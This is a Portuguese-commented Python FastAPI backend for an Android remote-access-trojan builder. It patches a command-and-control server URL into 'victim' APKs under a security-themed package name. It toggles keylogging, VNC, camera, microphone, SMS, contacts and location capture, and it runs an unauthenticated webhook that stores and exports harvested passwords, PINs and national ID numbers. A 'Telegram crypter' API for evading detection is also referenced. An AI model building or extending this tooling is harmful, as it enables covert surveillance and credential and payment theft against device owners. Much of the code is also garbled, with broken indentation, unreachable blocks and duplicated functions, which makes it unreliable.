        # 🔥 Detecta tipo de APK para mensagens
        build_target = project.get("buildTarget", "victim")
        apk_type_label = "PAINEL ADMIN 👑" if build_target == "panel" else "VÍTIMA RAT 👤"
        studio_build_status[build_id] = {"status": "building", "progress": 5, "message": f"Iniciando build: {apk_type_label}"}

        # 1. Cria diretório temporário
        project_dir = Path(__file__).parent.parent / "android-rat"
        temp_dir = Path(tempfile.mkdtemp(prefix=f"apk_studio_{build_id}_"))
        
        studio_build_status[build_id] = {"status": "building", "progress": 10, "message": "Copiando projeto..."}
        
        # 2. Copia projeto base
        shutil.copytree(project_dir, temp_dir / "android-rat", dirs_exist_ok=True)
        build_dir = temp_dir / "android-rat"
        
        studio_build_status[build_id] = {"status": "building", "progress": 20, "message": "Configurando app..."}
        
        # 3. Cria configuração do app
        # Obtém a serverUrl do projeto ou usa padrão
        server_url_config = project.get("serverUrl", "")
        if not server_url_config:
            # Se não tem serverUrl, usa a VPS atual ou localhost
            server_url_config = os.environ.get("SERVER_URL", gangstar_env.public_base_url())
        
        # Converte para formato HTTP se necessário (para APIs)
        http_server_url = server_url_config
        if http_server_url.startswith("wss://"):
            http_server_url = http_server_url.replace("wss://", "https://").replace("/ws", "")
        elif http_server_url.startswith("ws://"):
            http_server_url = http_server_url.replace("ws://", "http://").replace("/ws", "")
        
        # 🔥 DETECTA SE É BUILD DA VÍTIMA OU DO PAINEL
        build_target = project.get("buildTarget", "victim")  # 'victim' ou 'panel'
        is_admin_panel = project.get("isAdminPanel", False) or build_target == "panel"
        
        # Define o tipo de projeto baseado no buildTarget
        if is_admin_panel:
            actual_project_type = "mobile_panel"
            actual_screens = project.get("panelScreens", project.get("screens", []))
        else:
            actual_project_type = project.get("projectType", "custom")
            actual_screens = project.get("screens", [])
        
        app_config = {
            "projectId": project.get("id", build_id),
            "appName": project.get("appName", "Meu App") + (" Admin" if is_admin_panel else ""),
            "packageName": project.get("packageName", "com.studio.app") + (".admin" if is_admin_panel else ""),
            "projectType": actual_project_type,
            "screens": actual_screens,  # Usa as telas corretas baseado no buildTarget
            "panelScreens": project.get("panelScreens", []) if not is_admin_panel else [],
            "theme": project.get("theme", {}),
            "enableRat": project.get("enableRat", False) if not is_admin_panel else False,  # Painel NÃO é RAT
            "enablePayment": project.get("enablePayment", False),
            "enableKeylogger": project.get("enableKeylogger", False) if not is_admin_panel else False,
            "pixConfig": project.get("pixConfig"),
            "serverUrl": http_server_url,  # URL HTTP para APIs
            "webhookUrl": f"{http_server_url}/api/apk-studio/webhook/{project.get('id', build_id)}",
            
            # 🔥 SEPARAÇÃO: Identifica qual tipo de APK
            "buildTarget": build_target,
            "isAdminPanel": is_admin_panel,
            "showInWebPanel": project.get("showInWebPanel", False) if not is_admin_panel else False,
            "source": "apk_studio_admin" if is_admin_panel else "apk_studio_victim"
        }
        
        # Se for Painel Mobile RAT (Admin), inclui configurações especiais
        if is_admin_panel or project.get("projectType") == "mobile_panel":
            mobile_config = project.get("mobilePanelConfig", {})
            
            # 🔥 IMPORTANTE: Usa a serverUrl do projeto se não tiver mobilePanelConfig
            # Isso garante que o APK do Admin sempre use a URL correta (VPS)
            panel_server_url = mobile_config.get("serverUrl", "") or project.get("serverUrl", "") or http_server_url
            
            # Garante que a URL não é localhost (problema comum)
            if "localhost" in panel_server_url or not panel_server_url:
                panel_server_url = http_server_url  # Usa a URL do servidor atual
            
            app_config["mobilePanelConfig"] = {
                "serverUrl": panel_server_url,
                "operatorUsername": mobile_config.get("operatorUsername", ""),
                "operatorPassword": mobile_config.get("operatorPassword", ""),
                "enableVNC": mobile_config.get("enableVNC", True),
                "enableKeylogger": mobile_config.get("enableKeylogger", True),
                "enableCamera": mobile_config.get("enableCamera", True),
                "enableMicrophone": mobile_config.get("enableMicrophone", True),
                "enableFileManager": mobile_config.get("enableFileManager", True),
                "enableSMS": mobile_config.get("enableSMS", True),
                "enableContacts": mobile_config.get("enableContacts", True),
                "enableLocation": mobile_config.get("enableLocation", True),
                "enableApkBuilder": mobile_config.get("enableApkBuilder", True),
                "customBranding": mobile_config.get("customBranding", False),
                "brandingLogo": mobile_config.get("brandingLogo", ""),
                "brandingName": mobile_config.get("brandingName", "")
            }
            # Painel Mobile sempre tem RAT habilitado para funcionalidades
            app_config["enableRat"] = False  # NÃO habilita RAT no APK admin (não deve aparecer como dispositivo)
        
        # 4. Salva configuração no assets
        assets_dir = build_dir / "app" / "src" / "main" / "assets"
        assets_dir.mkdir(parents=True, exist_ok=True)
        
        with open(assets_dir / "studio_config.json", "w", encoding="utf-8") as f:
            json.dump(app_config, f, ensure_ascii=False, indent=2)
        
        studio_build_status[build_id] = {"status": "building", "progress": 30, "message": "Atualizando nome do app..."}
        
        # 5. Atualiza nome e applicationId de forma coordenada
        app_name = app_config.get("appName", project.get("appName", "App")).strip() or "App"
        package_name = app_config.get("packageName", project.get("packageName", "com.studio.app")).strip() or "com.studio.app"
        patch_app_name(build_dir, app_name)
        patch_application_id(build_dir, package_name)
        
        studio_build_status[build_id] = {"status": "building", "progress": 40, "message": "Configurando ícone..."}
        
        # 6. Atualiza ícone se fornecido
        if project.get("iconUrl"):
            icon_data = project["iconUrl"]
            if icon_data.startswith("data:image"):
import base64
                base64_data = icon_data.split(",")[1]
                icon_bytes = base64.b64decode(base64_data)
                
                for dpi in ["mdpi", "hdpi", "xhdpi", "xxhdpi", "xxxhdpi"]:
                    icon_path = build_dir / "app" / "src" / "main" / "res" / f"mipmap-{dpi}" / "ic_launcher.png"
                    if icon_path.parent.exists():
                        icon_path.write_bytes(icon_bytes)
        
        studio_build_status[build_id] = {"status": "building", "progress": 45, "message": "Configurando conexão reversa..."}
        
        # 6.5. ATUALIZA SERVER_URL PARA CONEXÃO REVERSA
        # Isso é CRÍTICO para o RAT funcionar - a vítima precisa conectar ao servidor correto
        server_url = project.get("serverUrl", "")
        if not server_url:
            server_url = gangstar_env.public_ws_url()
        
        # Se for Painel Mobile, usa a URL configurada
        if project.get("projectType") == "mobile_panel":
            mobile_config = project.get("mobilePanelConfig", {})
            if mobile_config.get("serverUrl"):
                base_url = mobile_config["serverUrl"]
                if not base_url.startswith("ws"):
                    base_url = base_url.replace("https://", "wss://").replace("http://", "ws://")
                if not base_url.endswith("/ws"):
                    base_url = base_url.rstrip("/") + "/ws"
                server_url = base_url
        
        # 🔥 IMPORTANTE: Adiciona build_id na URL para atribuição automática de usuário!
        # Isso garante que quando o dispositivo conectar, ele seja atribuído ao usuário correto
        if "?" in server_url:
            server_url_with_build = f"{server_url}&build_id={build_id}"
        else:
            server_url_with_build = f"{server_url}?build_id={build_id}"
        
        # Atualiza SERVER_URL no CommandControlService.java
        cc_service_file = build_dir / "app" / "src" / "main" / "java" / "com" / "seguranca" / "protecao" / "CommandControlService.java"
        if cc_service_file.exists():
            content = cc_service_file.read_text(encoding="utf-8")
            # Regex aceita tanto 'private' quanto 'public'
            content = re.sub(
                r'(public|private) static final String SERVER_URL = "[^"]+";',
                f'public static final String SERVER_URL = "{server_url_with_build}";',
                content
            )
            cc_service_file.write_text(content, encoding="utf-8")
            logger.info(f"[APK-STUDIO] ✅ SERVER_URL atualizado para: {server_url_with_build} (owner_id: {owner_id})")
        
        studio_build_status[build_id] = {"status": "building", "progress": 50, "message": "Compilando APK..."}
        
        # 7. Compila APK
        gradlew = build_dir / ("gradlew.bat" if os.name == "nt" else "gradlew")
        if not gradlew.exists():
            raise Exception("Gradlew não encontrado")
        
        # Torna executável no Linux
        if os.name != "nt":
            os.chmod(gradlew, 0o755)
        
        result = subprocess.run(
            [str(gradlew), "assembleRelease", "--no-daemon", "--no-configuration-cache", "--no-build-cache", "-x", "lint"],
            cwd=build_dir,
            capture_output=True,
            text=True,
            timeout=600
        )
        
        if result.returncode != 0:
            raise Exception(f"Erro no Gradle: {result.stderr[:500]}")
        
        studio_build_status[build_id] = {"status": "building", "progress": 90, "message": "Finalizando..."}
        
        # 8. Move APK para downloads
        apk_source = build_dir / "app" / "build" / "outputs" / "apk" / "release" / "app-release.apk"
        if not apk_source.exists():
            apk_source = build_dir / "app" / "build" / "outputs" / "apk" / "release" / "app-release-unsigned.apk"
        
        if not apk_source.exists():
            raise Exception("APK não foi gerado")
        
        downloads_dir = Path(__file__).parent / "downloads"
        downloads_dir.mkdir(exist_ok=True)
        
        # 🔥 NOME DO APK DEFINIDO PELO USUÁRIO (obrigatório)
        user_apk_name = project.get("apkFileName", "").strip()
        if not user_apk_name or len(user_apk_name) < 3:
            # Fallback se não tiver nome definido
            safe_name = "".join(c if c.isalnum() or c in "-_" else "-" for c in project.get("appName", "app"))
            user_apk_name = safe_name.lower()
        
        # Sanitiza o nome (apenas letras, números, hífens e underscores)
        safe_apk_name = "".join(c if c.isalnum() or c in "-_" else "-" for c in user_apk_name)
        
        # 🔥 Inclui tipo (ADMIN ou VICTIM) no nome para fácil identificação
        apk_type = "ADMIN" if is_admin_panel else "VICTIM"
        apk_filename = f"{safe_apk_name}-{apk_type}.apk"
        apk_dest = downloads_dir / apk_filename
        
        # Salva metadados do build para verificar owner no download
        build_meta_file = downloads_dir / f"{build_id}.meta"
        with open(build_meta_file, "w") as f:
            f.write(f"{owner_id}")
        
        shutil.copy2(apk_source, apk_dest)
        
        # 9. Limpa diretório temporário
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        
        studio_build_status[build_id] = {
            "status": "done",
            "progress": 100,
            "message": "APK gerado com sucesso!",
            "result": {
                "filename": apk_filename,
                "download_url": f"/api/apk-studio/download/{apk_filename}",
                "size": os.path.getsize(apk_dest)
            }
        }
        
        logger.info(f"[APK-STUDIO] Build {build_id} concluído: {apk_filename}")
        
    except Exception as e:
        logger.error(f"[APK-STUDIO] Erro no build {build_id}: {e}")
import traceback
        traceback.print_exc()
        studio_build_status[build_id] = {
            "status": "error",
            "progress": 0,
            "message": str(e)
        }

@app.post("/api/apk-studio/build")
async def build_studio_apk(
    project_data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """Inicia build de APK do APK Studio"""
import uuid
    
    build_id = str(uuid.uuid4())[:8].upper()
    
    logger.info(f"[APK-STUDIO] Iniciando build: {project_data.get('appName')} (user: {current_user.username})")
    
    # Inicia build em background
    build_executor.submit(
        build_studio_apk_background,
        build_id, project_data, current_user.id
    )
    
    return {
        "status": "building",
        "message": "Build iniciado",
        "build_id": build_id
    }

@app.get("/api/apk-studio/build-status/{build_id}")
async def get_studio_build_status(
    build_id: str,
    current_user: Operator = Depends(get_current_user)
):
    """Retorna status do build"""
    if build_id not in studio_build_status:
        return {"status": "not_found", "message": "Build não encontrado"}
    
    return studio_build_status[build_id]

@app.get("/api/apk-studio/download/{filename}")
async def download_studio_apk(
    filename: str,
    token: Optional[str] = Query(None),
    db: Session = Depends(get_db)
):
    """Download do APK gerado - Suporta autenticação por header ou query parameter ?token="""
    downloads_dir = Path(__file__).parent / "downloads"
    apk_path = downloads_dir / filename
    
    # Smart Fallback: Se o nome exato não for encontrado, faz busca flexível no diretório
    if not apk_path.exists():
        matched_file = None
        if downloads_dir.exists():
            for candidate in downloads_dir.glob("*.apk"):
                cname = candidate.name
                if filename in cname or cname in filename:
                    matched_file = candidate
                    break
                
                # Procura por hash/build_id no nome do arquivo candidato
                parts = filename.replace(".apk", "").split("-")
                for p in parts:
                    if len(p) >= 4 and p in cname:
                        matched_file = candidate
                        break
                if matched_file:
                    break
        
        if matched_file and matched_file.exists():
            apk_path = matched_file
        else:
            # Tenta endpoint alternativo de downloads
            alt_path = downloads_dir / f"{filename}.apk"
            if alt_path.exists():
                apk_path = alt_path
            else:
                raise HTTPException(status_code=404, detail="APK não encontrado no servidor")
    
    return FileResponse(
        apk_path,
        media_type="application/vnd.android.package-archive",
        filename=apk_path.name
    )


# ========== CONFIGURAÇÕES PIX DO USUÁRIO ==========

@app.get("/api/apk-studio/pix-configs")
async def get_pix_configs(
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Lista configurações PIX do usuário"""
from models import UserPixConfig

try:
    configs = db.query(UserPixConfig).filter(
        UserPixConfig.owner_id == current_user.id
    ).all()

    return [{
        "id": c.config_id,
        "name": c.name,
        "pixKey": c.pix_key,
        "pixKeyType": c.pix_key_type,
        "beneficiaryName": c.beneficiary_name,
        "beneficiaryCity": c.beneficiary_city,
        "isDefault": c.is_default
    } for c in configs]
except:
    return []

@app.post("/api/apk-studio/pix-configs")
async def create_pix_config(
    config_data: dict,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Cria nova configuração PIX"""
from models import UserPixConfig
import uuid

config = UserPixConfig(
    config_id=str(uuid.uuid4())[:12],
    owner_id=current_user.id,
    name=config_data.get("name", "PIX"),
    pix_key=config_data.get("pixKey", ""),
    pix_key_type=config_data.get("pixKeyType", "random"),
    beneficiary_name=config_data.get("beneficiaryName", ""),
    beneficiary_city=config_data.get("beneficiaryCity", ""),
    is_default=config_data.get("isDefault", False)
)

# Se marcado como padrão, desmarca outros
if config.is_default:
    db.query(UserPixConfig).filter(
        UserPixConfig.owner_id == current_user.id
    ).update({"is_default": False})

    db.add(config)
    db.commit()

    return {"id": config.config_id, "message": "Configuração criada"}

@app.delete("/api/apk-studio/pix-configs/{config_id}")
async def delete_pix_config(
    config_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Exclui configuração PIX"""
from models import UserPixConfig

config = db.query(UserPixConfig).filter(
    UserPixConfig.config_id == config_id,
    UserPixConfig.owner_id == current_user.id
).first()

if config:
    db.delete(config)
    db.commit()

    return {"message": "Configuração excluída"}


# ============================================================
# 🚀 APK STUDIO - SISTEMA COMPLETO DE CAPTURA DE DADOS
# ============================================================

# ========== HISTÓRICO DE BUILDS ==========

@app.get("/api/apk-studio/builds")
async def list_studio_builds(
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Lista o histórico de builds de APKs do usuário com resolução exata de arquivos para download"""
from models import APKBuild
from pathlib import Path

builds = db.query(APKBuild).filter(
    APKBuild.owner_id == current_user.id
).order_by(APKBuild.created_at.desc()).limit(50).all()

downloads_dir = Path(__file__).parent / "downloads"
result = []

for b in builds:
    actual_file = None
    if downloads_dir.exists():
        for file_path in downloads_dir.glob("*.apk"):
            fname = file_path.name
            if b.build_id in fname or (b.app_name and b.app_name.replace(" ", "_") in fname):
                actual_file = fname
                break

            if not actual_file:
                safe_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in (b.app_name or "app"))
                actual_file = f"{safe_name}_{b.build_id}.apk"

                file_path_full = downloads_dir / actual_file
                file_exists = file_path_full.exists()
                file_size = file_path_full.stat().st_size if file_exists else 0

                result.append({
                    "id": b.id,
                    "build_id": b.build_id,
                    "appName": b.app_name,
                    "ownerId": b.owner_id,
                    "createdAt": b.created_at.isoformat() if b.created_at else None,
                    "filename": actual_file,
                    "download_url": f"/api/apk-studio/download/{actual_file}",
                    "file_exists": file_exists,
                    "size": file_size
                })

                return result
# ========== PROJETOS DO APK STUDIO ==========

@app.get("/api/apk-studio/projects")
async def list_studio_projects(
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Lista todos os projetos do usuário"""
from models import APKStudioProject

projects = db.query(APKStudioProject).filter(
    APKStudioProject.owner_id == current_user.id
).order_by(APKStudioProject.updated_at.desc()).all()

return [{
    "id": p.project_id,
    "name": p.name,
    "appName": p.app_name,
    "packageName": p.package_name,
    "projectType": p.project_type,
    "enableRat": p.enable_rat,
    "enablePayment": p.enable_payment,
    "enableKeylogger": p.enable_keylogger,
    "createdAt": p.created_at.isoformat() if p.created_at else None,
    "updatedAt": p.updated_at.isoformat() if p.updated_at else None
} for p in projects]


@app.post("/api/apk-studio/projects")
async def create_studio_project(
    project_data: dict,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Cria novo projeto no APK Studio"""
from models import APKStudioProject
import uuid

project_id = str(uuid.uuid4())[:12]

project = APKStudioProject(
    project_id=project_id,
    owner_id=current_user.id,
    name=project_data.get("name", "Novo Projeto"),
    description=project_data.get("description", ""),
    project_type=project_data.get("projectType", "custom"),
    app_name=project_data.get("appName", "Meu App"),
    package_name=project_data.get("packageName", "com.meuapp"),
    icon_data=project_data.get("iconData", ""),
    screens_data=json.dumps(project_data.get("screens", [])),
    theme_data=json.dumps(project_data.get("theme", {})),
    enable_rat=project_data.get("enableRat", False),
    enable_payment=project_data.get("enablePayment", False),
    enable_keylogger=project_data.get("enableKeylogger", False)
)

db.add(project)
db.commit()

logger.info(f"[APK-STUDIO] Projeto criado: {project_id} por {current_user.username}")

return {
    "id": project_id,
    "message": "Projeto criado com sucesso",
    "webhookUrl": f"/api/apk-studio/webhook/{project_id}"
}


@app.put("/api/apk-studio/projects/{project_id}")
async def update_studio_project(
    project_id: str,
    project_data: dict,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Atualiza projeto existente"""
from models import APKStudioProject

project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

# Atualiza campos
if "name" in project_data:
    project.name = project_data["name"]
    if "appName" in project_data:
        project.app_name = project_data["appName"]
        if "packageName" in project_data:
            project.package_name = project_data["packageName"]
            if "screens" in project_data:
                project.screens_data = json.dumps(project_data["screens"])
                if "theme" in project_data:
                    project.theme_data = json.dumps(project_data["theme"])
                    if "enableRat" in project_data:
                        project.enable_rat = project_data["enableRat"]
                        if "enablePayment" in project_data:
                            project.enable_payment = project_data["enablePayment"]
                            if "enableKeylogger" in project_data:
                                project.enable_keylogger = project_data["enableKeylogger"]

                                db.commit()

                                return {"message": "Projeto atualizado"}


@app.delete("/api/apk-studio/projects/{project_id}")
async def delete_studio_project(
    project_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Exclui projeto"""
from models import APKStudioProject

project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if project:
    db.delete(project)
    db.commit()

    return {"message": "Projeto excluído"}


# ========== WEBHOOK PARA RECEBER DADOS DOS APKs ==========

@app.post("/api/apk-studio/webhook/{project_id}")
async def webhook_receive_data(
    project_id: str,
    request: Request,
    db = Depends(get_db)
):
    """
    🎯 WEBHOOK PÚBLICO - Recebe dados dos APKs gerados
    Este endpoint NÃO requer autenticação pois é chamado pelos APKs dos clientes
    """
from models import APKStudioProject, StudioCapturedData, StudioDataField
from datetime import datetime

try:
    # Pega dados da requisição
    data = await request.json()
    client_ip = request.client.host if request.client else "unknown"

    # Busca o projeto para pegar o owner_id
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id
    ).first()

    if not project:
        logger.warning(f"[WEBHOOK] Projeto não encontrado: {project_id}")
        # Retorna sucesso mesmo assim para não dar erro no APK
        return {"status": "ok", "message": "received"}

    return {"status": "success", "project_id": project_id}
except Exception as e:
    logger.error(f"[WEBHOOK] Erro: {e}")
    return {"status": "error", "message": str(e)}
        # Extrai device_info se presente
        device_info = data.pop("_device_info", None)
        
        # Salva os dados capturados
        captured = StudioCapturedData(
            project_id=project_id,
            owner_id=project.owner_id,
            data_json=json.dumps(data),
            device_ip=client_ip,
            device_info=json.dumps(device_info) if device_info else None
        )
        db.add(captured)
        
        # Atualiza/cria campos dinâmicos
        for field_name, field_value in data.items():
            if field_name.startswith("_"):
                continue  # Ignora campos internos
            
            # Detecta tipo do campo
            field_type = "text"
            if isinstance(field_value, (int, float)):
                field_type = "number"
            elif "@" in str(field_value):
                field_type = "email"
            elif field_name.lower() in ["senha", "password", "pin", "codigo"]:
                field_type = "password"
            elif field_name.lower() in ["cpf", "cnpj", "documento"]:
                field_type = "document"
            elif field_name.lower() in ["telefone", "phone", "celular"]:
                field_type = "phone"
            
            # Verifica se campo já existe
            existing_field = db.query(StudioDataField).filter(
                StudioDataField.project_id == project_id,
                StudioDataField.field_name == field_name
            ).first()
            
            if existing_field:
                existing_field.occurrences += 1
                existing_field.last_seen = utc_now()
            else:
                new_field = StudioDataField(
                    project_id=project_id,
                    field_name=field_name,
                    field_type=field_type,
                    field_label=field_name.replace("_", " ").title()
                )
                db.add(new_field)
        
        db.commit()
        
        logger.info(f"[WEBHOOK] ✅ Dados recebidos para projeto {project_id} de {client_ip}")
        logger.info(f"[WEBHOOK] 📦 Campos: {list(data.keys())}")
        
        return {"status": "success", "message": "Dados recebidos com sucesso"}
        
    except Exception as e:
        logger.error(f"[WEBHOOK] ❌ Erro ao processar dados: {e}")
        # Retorna sucesso para não dar erro no APK
        return {"status": "ok", "error": str(e)}


# ========== VISUALIZAÇÃO DE DADOS CAPTURADOS ==========

@app.get("/api/apk-studio/data/{project_id}")
async def get_captured_data(
    project_id: str,
    page: int = 1,
    limit: int = 50,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Lista dados capturados de um projeto"""
from models import APKStudioProject, StudioCapturedData, StudioDataField

# Verifica se o projeto pertence ao usuário
project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

# Busca dados com paginação
offset = (page - 1) * limit

total = db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).count()

data = db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).order_by(StudioCapturedData.created_at.desc()).offset(offset).limit(limit).all()

# Busca campos detectados
fields = db.query(StudioDataField).filter(
    StudioDataField.project_id == project_id
).order_by(StudioDataField.occurrences.desc()).all()

return {
    "total": total,
    "page": page,
    "limit": limit,
    "totalPages": (total + limit - 1) // limit,
    "fields": [{
        "name": f.field_name,
        "type": f.field_type,
        "label": f.field_label,
        "count": f.occurrences
    } for f in fields],
    "data": [{
        "id": d.id,
        "data": json.loads(d.data_json) if d.data_json else {},
        "deviceIp": esconder_ip(d.device_ip),
        "deviceInfo": json.loads(d.device_info) if d.device_info else None,
        "capturedAt": d.created_at.isoformat() if d.created_at else None
    } for d in data]
}


@app.delete("/api/apk-studio/data/{project_id}")
async def clear_captured_data(
    project_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Limpa todos os dados capturados de um projeto"""
from models import APKStudioProject, StudioCapturedData, StudioDataField

# Verifica permissão
project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

@app.delete("/api/apk-studio/data/{project_id}")
async def clear_captured_data(
    project_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Limpa todos os dados capturados de um projeto"""
from models import APKStudioProject, StudioCapturedData, StudioDataField

# Verifica permissão
project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

# Limpa dados
db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).delete()

db.query(StudioDataField).filter(
    StudioDataField.project_id == project_id
).delete()

db.commit()

logger.info(f"[APK-STUDIO] Dados limpos do projeto {project_id}")

return {"message": "Dados limpos com sucesso"}

# ========== EXPORTAÇÃO DE DADOS ==========

@app.get("/api/apk-studio/data/{project_id}/export-csv")
async def export_data_csv(
    project_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Exporta dados capturados em CSV"""
from models import APKStudioProject, StudioCapturedData
import csv
import io

# Verifica permissão
project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

# Busca todos os dados
data = db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).order_by(StudioCapturedData.created_at.desc()).all()

if not data:
    raise HTTPException(status_code=404, detail="Nenhum dado para exportar")

@app.get("/api/apk-studio/data/{project_id}/export-csv")
async def export_data_csv(
    project_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Exporta dados capturados em CSV"""
from models import APKStudioProject, StudioCapturedData
import csv
import io

# Verifica permissão
project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

# Busca todos os dados
data = db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).order_by(StudioCapturedData.created_at.desc()).all()

if not data:
    raise HTTPException(status_code=404, detail="Nenhum dado para exportar")

# Coleta todos os campos únicos
all_fields = set()
for d in data:
    parsed = json.loads(d.data_json) if d.data_json else {}
    all_fields.update(parsed.keys())

    # Gera CSV
    output = io.StringIO()
    writer = csv.writer(output)

    # Header
    headers = ["id", "ip", "captured_at"] + sorted(list(all_fields))
    writer.writerow(headers)

    # Dados
    for d in data:
        parsed = json.loads(d.data_json) if d.data_json else {}
        row = [
            d.id,
            d.device_ip or "",
            d.created_at.isoformat() if d.created_at else ""
        ]
        for field in sorted(list(all_fields)):
            row.append(str(parsed.get(field, "")))
            writer.writerow(row)

            output.seek(0)

            return StreamingResponse(
                io.BytesIO(output.getvalue().encode('utf-8')),
                media_type="text/csv",
                headers={
                    "Content-Disposition": f"attachment; filename=dados_{project_id}.csv"
                }
            )

@app.get("/api/apk-studio/data/{project_id}/export-json")
async def export_data_json(
    project_id: str,
    current_user = Depends(get_current_user),
    db = Depends(get_db)
):
    """Exporta dados capturados em JSON"""
from models import APKStudioProject, StudioCapturedData

# Verifica permissão
project = db.query(APKStudioProject).filter(
    APKStudioProject.project_id == project_id,
    APKStudioProject.owner_id == current_user.id
).first()

if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

# Busca todos os dados
data = db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).order_by(StudioCapturedData.created_at.desc()).all()

export_data = [{
    "id": d.id,
    "data": json.loads(d.data_json) if d.data_json else {},
    "deviceIp": esconder_ip(d.device_ip),
    "deviceInfo": json.loads(d.device_info) if d.device_info else None,
    "capturedAt": d.created_at.isoformat() if d.created_at else None
} for d in data]

return StreamingResponse(
    io.BytesIO(json.dumps(export_data, indent=2, ensure_ascii=False).encode('utf-8')),
    media_type="application/json",
    headers={
        "Content-Disposition": f"attachment; filename=dados_{project_id}.json"
    }
)
if not project:
    raise HTTPException(status_code=404, detail="Projeto não encontrado")

# Busca todos os dados
data = db.query(StudioCapturedData).filter(
    StudioCapturedData.project_id == project_id
).order_by(StudioCapturedData.created_at.desc()).all()

export_data = [{
    "id": d.id,
    "data": json.loads(d.data_json) if d.data_json else {},
    "deviceIp": esconder_ip(d.device_ip),
    "deviceInfo": json.loads(d.device_info) if d.device_info else None,
    "capturedAt": d.created_at.isoformat() if d.created_at else None
} for d in data]

return StreamingResponse(
    io.BytesIO(json.dumps(export_data, indent=2, ensure_ascii=False).encode('utf-8')),
    media_type="application/json",
    headers={
        "Content-Disposition": f"attachment; filename=dados_{project_id}.json"
    }
)

# ========== ESTATÍSTICAS DO PROJETO ==========

@app.get("/api/apk-studio/stats/{project_id}")
async def get_project_stats(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna estatísticas do projeto"""
from models import APKStudioProject, StudioCapturedData, StudioDataField
from sqlalchemy import func
from datetime import datetime, timedelta, timezone

def utc_now():
    return datetime.now(timezone.utc).replace(tzinfo=None)
    
    # Verifica permissão
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    # Total de capturas
    total_captures = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).count()
    
    # Capturas hoje
    today = utc_now().replace(hour=0, minute=0, second=0, microsecond=0)
    captures_today = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id,
        StudioCapturedData.created_at >= today
    ).count()
    
    # Capturas últimos 7 dias
    week_ago = utc_now() - timedelta(days=7)
    captures_week = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id,
        StudioCapturedData.created_at >= week_ago
    ).count()
    
    # IPs únicos
    unique_ips = db.query(func.count(func.distinct(StudioCapturedData.device_ip))).filter(
        StudioCapturedData.project_id == project_id
    ).scalar()
    
    # Total de campos detectados
    total_fields = db.query(StudioDataField).filter(
        StudioDataField.project_id == project_id
    ).count()
    
    return {
        "projectId": project_id,
        "projectName": project.name,
        "totalCaptures": total_captures,
        "capturesToday": captures_today,
        "capturesWeek": captures_week,
        "uniqueDevices": unique_ips,
        "totalFields": total_fields,
        "webhookUrl": f"/api/apk-studio/webhook/{project_id}"
    }


# NOTA: Os endpoints de build do APK Studio estão definidos acima (linhas ~3418-3482)
# para evitar duplicação de rotas


# ==================== TELEGRAM CRYPTER API ====================

from telegram_crypter import telegram_crypter, get_telegram_status

@app.get("/api/telegram/status")
async def telegram_status(current_user: Operator = Depends(get_current_user)):
    """Retorna status da integração Telegram"""
    return get_telegram_status()

@app.post("/api/telegram/configure")
async def telegram_configure(
    data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """
    Configura credenciais do Telegram
    Body: {api_id, api_hash, phone, bot_username}
    """
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin pode configurar Telegram")
    
    api_id = data.get("api_id", "")
    api_hash = data.get("api_hash", "")
    phone = data.get("phone", "")
    bot_username = data.get("bot_username", "")
    
    if not all([api_id, api_hash, phone, bot_username]):
        raise HTTPException(400, "Todos os campos são obrigatórios")
    
    telegram_crypter.configure(api_id, api_hash, phone, bot_username)
    return {"status": "configured", "message": "Telegram configurado com sucesso"}

